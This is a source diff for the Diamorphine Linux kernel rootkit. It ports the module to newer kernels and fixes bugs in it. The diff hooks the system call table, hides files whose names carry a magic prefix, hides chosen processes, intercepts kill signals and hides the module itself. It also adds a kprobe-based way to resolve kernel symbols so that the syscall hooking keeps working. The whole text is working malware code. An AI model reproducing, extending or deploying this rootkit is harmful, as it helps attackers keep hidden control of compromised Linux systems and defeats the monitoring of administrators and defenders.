@@ -46,15 +46,38 @@ static unsigned long *__sys_call_table;
 	static t_syscall orig_getdents64;
 	static t_syscall orig_kill;
 #else
-	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
-		unsigned int);
-	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
+	typedef asmlinkage long (*orig_getdents_t)(unsigned int,
+            struct linux_dirent *, unsigned int);
+	typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
 		struct linux_dirent64 *, unsigned int);
-	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+	typedef asmlinkage long (*orig_kill_t)(pid_t, int);
 	orig_getdents_t orig_getdents;
 	orig_getdents64_t orig_getdents64;
 	orig_kill_t orig_kill;
 #endif
+
+
+#ifdef KPROBE_LOOKUP
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+// different name to avoid shadowing the real function in kernels that do have
+// the symbol.
+kallsyms_lookup_name_t kallsyms_lookup_name_ = NULL;
+#endif
+
+unsigned long resolve_sym(char *symbol)
+{
+#ifdef KPROBE_LOOKUP
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+    if (kallsyms_lookup_name_ == NULL) {
+        register_kprobe(&kp);
+        kallsyms_lookup_name_ = (kallsyms_lookup_name_t) kp.addr;
+        unregister_kprobe(&kp);
+    }
+	kallsyms_lookup_name = kallsyms_lookup_name_;
+#endif
+	return kallsyms_lookup_name(symbol);
+}
+
 
 unsigned long *
 get_syscall_table_bf(void)
@@ -62,14 +85,7 @@ get_syscall_table_bf(void)
 	unsigned long *syscall_table;
 	
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-#ifdef KPROBE_LOOKUP
-	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-	kallsyms_lookup_name_t kallsyms_lookup_name;
-	register_kprobe(&kp);
-	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-	unregister_kprobe(&kp);
-#endif
-	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	syscall_table = (unsigned long*)resolve_sym("sys_call_table");
 	return syscall_table;
 #else
 	unsigned long int i;
@@ -121,13 +137,13 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
 #endif
 	int ret = orig_getdents64(pt_regs), err;
 #else
-asmlinkage int
+asmlinkage long
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	unsigned int count)
 {
 	int ret = orig_getdents64(fd, dirent, count), err;
 #endif
-	unsigned short proc = 0;
+	unsigned short proc = 0, namelen = 0;
 	unsigned long off = 0;
 	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
 	struct inode *d_inode;
@@ -154,7 +170,8 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-		if ((!proc &&
+        namelen = dir->d_reclen - offsetof(struct linux_dirent64, d_name);
+		if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
 		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
@@ -187,13 +204,13 @@ static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
 #endif
 	int ret = orig_getdents(pt_regs), err;
 #else
-asmlinkage int
+asmlinkage long
 hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	unsigned int count)
 {
 	int ret = orig_getdents(fd, dirent, count), err;
 #endif
-	unsigned short proc = 0;
+	unsigned short proc = 0, namelen = 0;
 	unsigned long off = 0;
 	struct linux_dirent *dir, *kdirent, *prev = NULL;
 	struct inode *d_inode;
@@ -221,7 +238,8 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-		if ((!proc && 
+        namelen = dir->d_reclen - offsetof(struct linux_dirent, d_name);
+		if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
 		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
@@ -298,7 +316,7 @@ module_hide(void)
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-asmlinkage int
+asmlinkage long
 hacked_kill(const struct pt_regs *pt_regs)
 {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
@@ -309,7 +327,7 @@ hacked_kill(const struct pt_regs *pt_regs)
 	int sig = (int) pt_regs->regs[1];
 #endif
 #else
-asmlinkage int
+asmlinkage long
 hacked_kill(pid_t pid, int sig)
 {
 #endif
@@ -390,9 +408,9 @@ diamorphine_init(void)
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	cr0 = read_cr0();
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
-	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
-	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+	update_mapping_prot = (void *)resolve_sym("update_mapping_prot");
+	start_rodata = (unsigned long)resolve_sym("__start_rodata");
+	init_begin = (unsigned long)resolve_sym("__init_begin");
 #endif
 
 	module_hide();
